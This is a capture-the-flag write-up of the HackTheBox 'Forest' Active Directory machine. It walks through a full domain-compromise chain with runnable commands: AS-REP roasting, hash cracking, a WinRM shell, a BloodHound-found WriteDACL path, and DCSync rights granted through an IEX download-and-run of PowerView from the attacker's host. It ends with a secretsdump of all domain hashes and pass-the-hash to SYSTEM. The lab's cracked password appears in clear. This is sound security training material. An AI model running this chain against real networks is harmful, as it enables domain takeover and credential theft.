# Forest

**By Stager** | FashilHack

---

## What is this machine

Forest is an easy-medium Windows Active Directory box on HackTheBox. It's one of the best boxes for learning AD attack chains from scratch. No web vulnerabilities, no file uploads — just pure Active Directory enumeration and exploitation.

The path goes: anonymous enumeration → AS-REP Roasting → shell → BloodHound path → DCSync → domain compromise. Every step is a real-world Active Directory attack technique used in actual penetration tests.

---

## Target

```
IP:   10.10.10.161
OS:   Windows Server (Active Directory)
Domain: htb.local
```

---

## Step 1 — Nmap Scan

```bash
nmap -sC -sV -oA nmap/forest 10.10.10.161 -v
sleep 300; nmap -p- -oA nmap/forest-allports -v 10.10.10.161
```

Key ports found:

| Port | Service | Detail |
|---|---|---|
| 53 | DNS | Domain DNS |
| 88 | Kerberos | AD authentication |
| 135 | RPC | Remote Procedure Call |
| 139/445 | SMB | File sharing |
| 389 | LDAP | Directory services |
| 3268 | LDAP GC | Global Catalog |
| 5985 | WinRM | Remote management |

Port 88 (Kerberos) and 389 (LDAP) confirmed this was a Domain Controller immediately.

![Nmap Results](./images/nmap.png)

---

## Step 2 — SMB Enumeration

Checked for anonymous SMB shares:

```bash
smbclient -L 10.10.10.161
```

No shares accessible anonymously. Moved on.

---

## Step 3 — DNS Enumeration

```bash
nslookup 10.10.10.161
```

Quick tip: if you ping the host and TTL is 127 it's Windows. If TTL is 64 it's Linux.

---

## Step 4 — LDAP Enumeration

First confirmed the domain naming context:

```bash
ldapsearch -H ldap://10.10.10.161 -x -s base namingcontext
```

Then pulled all users from the domain:

```bash
ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=)' 'sAMAccountName' | grep sAMAccountName
```

Got a list of domain users. Saved them to users.txt.

![LDAP Users](./images/ldap-users.png)

---

## Step 5 — RPC Enumeration

LDAP gave users but RPC can give more — including users LDAP misses and group membership info.

```bash
rpcclient -U "" -N 10.10.10.161
```

Anonymous login worked. Inside:

```bash
enumdomusers         # all domain users
queryusergroups <rid>   # what groups is this user in
querygroup <rid>        # what is this group called
queryuser <rid>         # password last set, must change password info
```

The password last set and must change password fields matter when doing password spraying — accounts with old passwords or forced resets behave differently.

![RPC Enumeration](./images/rpc-enum.png)

---

## Step 6 — Password Policy Check

Before any brute force — always check the password policy first to avoid locking accounts out:

```bash
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
```

Null authentication worked — old domain. This is a reportable finding in a real pentest. Noted it.

![Password Policy](./images/pass-pol.png)

---

## Step 7 — AS-REP Roasting

Some accounts have Kerberos pre-authentication disabled. These accounts will hand you an encrypted hash without needing a password first. This is called AS-REP Roasting.

```bash
impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
```

Got a hash back for a service account. Saved it to hash.txt.

![AS-REP Hash](./images/asrep-hash.png)

---

## Step 8 — Cracking the Hash

Found the correct hashcat mode:

```bash
hashcat --example-hashes | grep -i krb
```

Mode was 18200 for Kerberos AS-REP hashes.

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Got the plaintext password.

![Hashcat Cracked](./images/hashcat.png)

---

## Step 9 — Shell via Evil-WinRM

Port 5985 (WinRM) was open. Logged in with the cracked credentials:

```bash
evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```

Shell obtained as svc-alfresco.

![Evil-WinRM Shell](./images/winrm-shell.png)

---

## Step 10 — BloodHound Enumeration

Ran SharpHound on the victim to collect AD data:

```bash
.\sharphound.exe -c all
```

On Kali started neo4j and BloodHound:

```bash
neo4j console
bloodhound --no-sandbox
```

Uploaded the SharpHound zip. BloodHound showed the attack path:

```
svc-alfresco
    → Service Accounts group
        → Privileged IT Accounts
            → Account Operators
                → Exchange Windows Permissions
                    → WriteDACL on htb.local domain object
```

Exchange Windows Permissions has WriteDACL on the domain. WriteDACL means I can modify the domain's access control list and grant myself DCSync rights.

![BloodHound Path](./images/bloodhound-path.png)

---

## Step 11 — Adding User and Escalating to Exchange Windows Permissions

Created a new domain user from the shell:

```bash
net user stager Passw0rd! /add /domain
net group "Exchange Windows Permissions" /add stager
```

---

## Step 12 — Granting DCSync Rights via PowerView

Downloaded PowerView from my Kali server:

```powershell
powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.x/powerview.ps1")
```

Built credential object for my new user:

```powershell
$pass = convertto-securestring 'Passw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\stager', $pass)
```

Granted DCSync rights to my user:

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity stager -Rights DCSync
```

My user now had DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights on the domain — meaning it could replicate password hashes like a Domain Controller would.

![DCSync Rights Granted](./images/dcsync-rights.png)

---

## Step 13 — Dumping All Hashes via Secretsdump

```bash
impacket-secretsdump htb.local/stager:Passw0rd!@10.10.10.161
```

Got NTLM hashes for every account in the domain including Administrator and krbtgt.

![Secretsdump Output](./images/secretsdump.png)

---

## Step 14 — Pass the Hash as Administrator

```bash
crackmapexec smb 10.10.10.161 -u administrator -H <ntlm_hash>
```

Pwned. Got the confirmation. Logged in with psexec:

```bash
impacket-psexec -hashes :<ntlm_hash> administrator@10.10.10.161
```

SYSTEM shell. Got root.txt.

![SYSTEM Shell](./images/system-shell.png)

---

## The Full Chain

```
Nmap → DC confirmed (ports 88, 389, 5985)
  ↓
LDAP + RPC → domain users enumerated
  ↓
AS-REP Roasting → svc-alfresco hash
  ↓
Hashcat → plaintext password cracked
  ↓
Evil-WinRM → shell as svc-alfresco
  ↓
SharpHound → BloodHound → WriteDACL path found
  ↓
New user created → added to Exchange Windows Permissions
  ↓
PowerView → Add-DomainObjectAcl → DCSync rights granted
  ↓
secretsdump → all domain hashes dumped
  ↓
Pass-the-Hash → psexec → SYSTEM
  ↓
root.txt
```

---

## What I learned from this one

**Always check for anonymous access first.** RPC and LDAP both worked without credentials. In a real engagement that's a finding on its own.

**AS-REP Roasting needs no credentials.** If pre-auth is disabled on an account you get a hash to crack offline. Service accounts are the most common targets.

**BloodHound shows you things you'd never find manually.** The nested group path from svc-alfresco to WriteDACL on the domain would have taken hours to find manually. BloodHound shows it in seconds.

**WriteDACL on a domain object = game over.** If any account or group can modify the domain DACL they can grant themselves DCSync and own the entire domain.

**DCSync doesn't need you to be on the DC.** You just need the right AD permissions. secretsdump does the rest remotely.

**Pass-the-Hash works when you have NTLM hashes.** You don't need to crack them. The hash itself is the credential in Windows authentication.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._